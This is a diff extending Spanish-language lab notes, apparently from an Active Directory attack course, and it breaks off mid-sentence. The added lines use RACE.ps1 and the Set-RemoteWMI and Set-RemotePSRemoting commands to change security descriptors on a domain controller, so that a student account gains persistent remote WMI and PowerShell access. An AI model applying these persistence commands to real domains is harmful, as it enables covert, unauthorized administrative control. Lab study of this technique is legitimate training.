@@ -1057,3 +1057,23 @@ Y a continuacion modificaremso los descriptores de seguridad del host para *WMI*
 [student97]
 Set-RemoteWMI -SamAccountName student97 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
 ```
+
+Ahora ya podemos ejecutar consultas *WMI* en el *Domain COntroller* como *student97*
+```shell
+[student97]
+gwmi -class win32_operatingsystem -ComputerName dcorp-dc
+```
+
+Se puede hacer una modificacion simialar a la configuracion de eliminacion de *PowerShell*
+```shell
+[student97]
+. C:\AD\Tools\RACE.ps1
+```
+
+```shell
+[student97]
+Set-RemotePSRemoting -SamAccountName student97 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+```
+Suele mostrar un error que podemos ignorar
+
+Ahora ya podemos ejecutar comandos usando el 
